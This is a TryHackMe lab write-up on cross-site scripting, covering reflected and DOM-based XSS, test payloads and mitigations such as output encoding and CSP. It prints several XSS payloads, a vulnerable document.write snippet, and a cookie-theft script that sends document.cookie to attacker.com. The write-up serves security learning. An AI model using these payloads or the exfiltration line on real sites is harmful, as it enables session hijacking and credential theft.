TryHackMe – Cross-Site Scripting (XSS) Lab
Lab Overview

This lab focuses on identifying and exploiting Cross-Site Scripting (XSS) vulnerabilities in a web application.

XSS occurs when an application includes untrusted user input in a webpage without proper validation or sanitization.
This allows attackers to execute malicious JavaScript in the browser of other users.

Platform: TryHackMe
Category: Web Application Security

What is XSS?

Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users.

Common impacts include:

Session hijacking
Credential theft
Defacement
Malicious redirects
Browser exploitation

XSS is part of the **OWASP Top 10 vulnerabilities.

Types of XSS
Reflected XSS

Occurs when user input is immediately returned in the HTTP response.

Example flow:

User input → Server response → Script executes in browser

Example payload:
```bash
<script>alert("XSS")</script>
```
DOM-Based XSS

Occurs when the vulnerability exists in client-side JavaScript.

Example vulnerable code:
```
document.write(location.hash);
```
Payload example:
```
http://target.com/#<script>alert(1)</script>
```
Discovering XSS

Common testing locations:

Search fields
Login forms
Comment sections
Contact forms
URL parameters

Example test payloads:
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
If the payload executes in the browser, the application is vulnerable.

Exploiting XSS

Once confirmed, attackers may attempt more advanced payloads.

Example cookie theft:
```
<script>
fetch("http://attacker.com?cookie=" + document.cookie)
</script>
```
This allows attackers to steal session tokens.

Tools Used

Browser Developer Tools
Burp Suite
Manual payload testing
Mitigation

To prevent XSS vulnerabilities, developers should:

Sanitize user input
Encode output properly
Use Content Security Policy (CSP)
Avoid unsafe JavaScript functions

Example safe output encoding:
```
textContent instead of innerHTML
```
Key Takeaways

XSS is one of the most common web vulnerabilities.

Input validation and output encoding are essential.

Even small input fields can become attack vectors.































